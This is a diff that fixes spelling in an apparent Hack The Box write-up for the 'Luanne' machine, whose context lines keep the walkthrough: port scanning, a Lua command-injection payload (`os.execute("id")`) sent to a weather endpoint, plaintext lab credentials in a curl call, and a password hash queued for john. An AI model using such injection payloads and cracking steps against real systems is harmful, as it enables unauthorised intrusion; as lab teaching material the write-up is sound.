@@ -1,6 +1,6 @@
 ![](luanne_banner.png)
 
-<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></img></a>
+<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></a>
 </p>
 
 # Scanning
@@ -31,8 +31,8 @@ Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
 ```
 
 * From port 80 nmap found a robots.txt file and inside that file there is a disallowed directory path `/weather`
-* Port 80 `http://10.10.10.218` throughs a login prompt
-* Port 9001 `http://10.10.10.218` throughs a login prompt 
+* Port 80 `http://10.10.10.218` through a login prompt
+* Port 9001 `http://10.10.10.218` through a login prompt 
 
 
 ## Web_server - Port 80
@@ -58,18 +58,18 @@ Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
 	  <br>Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
 
 * Error specified that the backend is running `lua` language.
-* try diffrent lua syntex and finaly execute lua syntex - 
+* try different lua syntax and finely execute lua syntax - 
 
 **Request:** `http://10.10.10.218/weather/forecast?city=%27%29%3Bprint%28%22pwn%22%29--`
 
 **Response:** `{"code": 500,"error": "unknown city: pwn`
 
-  * brackdown the payload - 
+  * breakdown the payload - 
     1. payload is url encoded formate
-	2. orignal lua syntex to fil the nill value `');<lua_syntex>--`
+	2. original lua syntax to fil the nill value `');<lua_syntax>--`
 
-* there is a `os.execute` function in the lua that exeecute shell command from lua syntex.
-* create a code executation payload with lua runtime - 
+* there is a `os.execute` function in the lua that execute shell command from lua syntax.
+* create a code execution payload with lua runtime - 
 
   **Payload:** `');os.execute("id")--`
 
@@ -79,7 +79,7 @@ Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
 
   **Response:** `"code": 500,"error": "unknown city: uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)`
 
-* and this verified the command execuation vulnerbility.
+* and this verified the command execution vulnerability.
 
 # User Exploit
 
@@ -197,7 +197,7 @@ Session completed
 	  </html>
 
 * same page that get from the port 80 login.
-* tested the code execuation vulnerbility here on port 3001 and it looks line local server is not vulnerable for command execuation -
+* tested the code execution vulnerability here on port 3001 and it looks line local server is not vulnerable for command execution -
 
 	  $ curl --user webapi_user:iamthebest "http://127.0.0.1:3001/weather/forecast?city=%27%29%3Bos.execute%28%22id%22%29--"
 	  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -282,7 +282,7 @@ dr-xr-x---  7 r.michaels  users   512 Sep 16 18:20 ..
 -r--------  1 r.michaels  users  1970 Nov 24 09:25 devel_backup-2020-09-16.tar.gz.enc
 ```
 
-**enc file extention:** The .enc file extension is used by files in the UUenconded format, which are encrypted files.
+**enc file extention:** The .enc file extension is used by files in the UUencoded format, which are encrypted files.
 
 **UUenconded format:** Unix-to-Unix encode (UUENCODE) format is a form of binary-to-text encoding that originated in the Unix programs uuencode and uudecode written by Mary Ann Horton at UC Berkeley in 1980, for encoding binary data for transmission in email systems.
 
@@ -325,6 +325,7 @@ drwxr-xr-x 2 x00tex x00tex 4096 Nov 29 20:06 www
 * inside the tar archive there is a server backup data and also the `.htpasswd` file with same username but this time the hash is diffrent.
 
 #### john
+
 ```diff
 ❯ echo 'webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.' >> hash
 
